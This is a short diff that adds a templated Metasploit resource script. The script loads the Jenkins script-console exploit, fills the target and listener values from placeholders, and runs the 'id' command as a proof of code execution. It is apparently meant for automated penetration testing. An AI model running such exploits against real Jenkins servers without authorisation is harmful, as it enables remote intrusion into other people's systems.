@@ -1,0 +1,8 @@
+use exploit/multi/http/jenkins_script_console
+set RHOSTS %%TARGET_IP%%
+set RPORT %%TARGET_PORT%%
+set LHOST %%LHOST%%
+set TARGETURI /
+set PAYLOAD cmd/unix/generic
+set CMD id
+run
